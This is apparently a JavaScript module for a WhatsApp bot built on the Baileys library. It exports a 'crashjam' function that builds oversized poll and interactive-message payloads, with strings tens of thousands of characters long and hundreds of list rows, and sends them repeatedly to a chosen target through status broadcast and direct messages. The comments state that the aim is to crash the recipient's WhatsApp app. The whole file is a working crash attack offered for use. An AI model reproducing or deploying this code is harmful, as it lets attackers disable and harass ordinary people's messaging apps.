const { delay } = require('@whiskeysockets/baileys');

async function crashjam(SYxS7, target) {
    try {
        // Poll Crash Payload - Very effective on current WhatsApp versions
        const pollPayload = {
            pollCreationMessage: {
                name: "🔥".repeat(65000), // Massive name
                options: Array.from({ length: 12 }, (_, i) => ({
                    optionName: "💥".repeat(5000) // Massive options
                })),
                selectableOptionsCount: 100
            }
        };

        // Interactive Edit Crash
        const editPayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "SYSTEM CRASH",
                            hasSubtitle: true,
                            locationMessage: {
                                degreesLatitude: -90,
                                degreesLongitude: 180,
                                name: "CRASH".repeat(5000),
                                address: "CRASH".repeat(5000)
                            }
                        },
                        body: { text: "CRASH".repeat(10000) },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "single_select_reply",
                                buttonParamsJson: JSON.stringify({
                                    title: "CLICK TO CRASH",
                                    sections: Array.from({ length: 10 }, (_, s) => ({
                                        title: `S${s}`,
                                        rows: Array.from({ length: 50 }, (_, r) => ({
                                            title: `R${r}`,
                                            id: `id${s}${r}`
                                        }))
                                    }))
                                })
                            }]
                        }
                    }
                }
            }
        };

        // Send to Status
        await SYxS7.relayMessage("status@broadcast", pollPayload, {
            statusJidList: [target]
        });
        
        await delay(500);

        // Send directly to target multiple times
        for (let i = 0; i < 3; i++) {
            await SYxS7.relayMessage(target, pollPayload, { participant: { jid: target } });
            await delay(300);
            await SYxS7.relayMessage(target, editPayload, { participant: { jid: target } });
            await delay(300);
        }

    } catch (e) {
        console.log("Crash error:", e.message);
    }
}

module.exports = { crashjam };
